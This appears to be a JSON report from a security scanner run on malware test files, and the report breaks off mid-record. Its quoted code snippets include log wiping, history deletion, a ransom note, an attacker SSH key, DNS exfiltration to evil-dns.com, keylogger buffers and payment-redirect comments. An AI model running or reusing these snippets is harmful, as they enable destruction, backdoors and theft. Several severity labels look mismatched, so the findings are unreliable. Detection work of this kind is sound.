{
  "coverage": 85,
  "duration_ms": 75,
  "files_scanned": 5,
  "issues": [
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.362949",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e490e3bc-29ab-4f08-bc7d-6bb03732f1fa",
      "last_modified": "",
      "line_number": 234,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.362949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/home/user/.bash_history')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.362949",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "34b2bb8f-a5a6-4e50-8cf4-adf9c62cebd4",
      "last_modified": "",
      "line_number": 237,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.362949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove(file_path)",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.363948",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "5e4f2c32-b293-4372-bd6a-cb9e1e6421fc",
      "last_modified": "",
      "line_number": 357,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.363948"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
      "column": 48,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.367944",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7345ac32-5561-4466-bba5-42c8b959fbcb",
      "last_modified": "",
      "line_number": 373,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.367944"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.369951",
      "data_classification": "UNKNOWN",
      "debt_category": "SECURITY_ISSUE",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "df2e4dca-0cd8-4242-b27a-cb3690f829cc",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-secrets-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Move secrets to environment variables or secure vault services.",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "VULNERABILITY",
      "update_date": "2025-08-11T20:30:43.369951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.372949",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "3ab1aa5f-9634-47f0-8d14-e70500566adb",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.372949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
      "column": 55,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.373950",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "5f7c0a27-048e-4c88-a773-d3c67ce03a0a",
      "last_modified": "",
      "line_number": 102,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.373950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
      "column": 16,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.375946",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e9564f4b-8e07-4e40-b36f-6085994658a4",
      "last_modified": "",
      "line_number": 459,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.375946"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "password_data = ''.join(captured_keys[-50:])",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.375946",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "cf767449-1cca-4eff-b523-ffce2ce352aa",
      "last_modified": "",
      "line_number": 462,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.375946"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "app.run(host='0.0.0.0', port=80)",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.377948",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "1c464f7b-f79e-4665-b123-9d5d867ba02a",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.377948"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
      "column": 10,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.378953",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "b0475616-fe0a-4e75-afbb-d6a0ef64d1d1",
      "last_modified": "",
      "line_number": 251,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.378953"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.380946",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "edd4e6c6-bdf7-46ca-8d10-dbbfecc4b192",
      "last_modified": "",
      "line_number": 34,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.380946"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.380946",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "b5f2be9d-3237-4a00-8ec3-6bb40015ff32",
      "last_modified": "",
      "line_number": 97,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.380946"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "data = f\"block_data_{nonce}\".encode()",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.381952",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "b10fa17f-c0cc-46e5-8406-b2746bdc94c9",
      "last_modified": "",
      "line_number": 262,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.381952"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
      "column": 36,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.382951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "951e7385-0fe6-4fa9-ab95-f7230c12aa6a",
      "last_modified": "",
      "line_number": 343,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.382951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"{ip}: {open_ports}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.382951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f897fa1e-c0f1-4731-85a8-7e01333878aa",
      "last_modified": "",
      "line_number": 513,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.382951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "ip = f\"{network}.{i}\"",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.382951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "5039e5ca-1ace-47df-8a3f-21d8e3a064d8",
      "last_modified": "",
      "line_number": 519,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.382951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "full_domain = f\"{sub}.{domain}\"",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.383951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "cf62702f-93e2-48bc-8028-af94ffe5f190",
      "last_modified": "",
      "line_number": 558,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.383951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.383951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "249040de-60a2-4746-a178-e8565335f8c6",
      "last_modified": "",
      "line_number": 560,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.383951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"SNMP access with community: {community}\")",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.383951",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7a5770a9-7546-431c-9878-c822ff01d442",
      "last_modified": "",
      "line_number": 586,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:30:43.383951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.398948",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "388bb582-68e8-4b10-ab38-5201607b371a",
      "last_modified": "",
      "line_number": 11,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.398948"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(amount, developer_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.398948",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "8cbd7bee-e5d3-44d1-a54f-51aa39303d45",
      "last_modified": "",
      "line_number": 76,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.398948"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payments to admin account during off-hours",
      "column": 15,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.398948",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
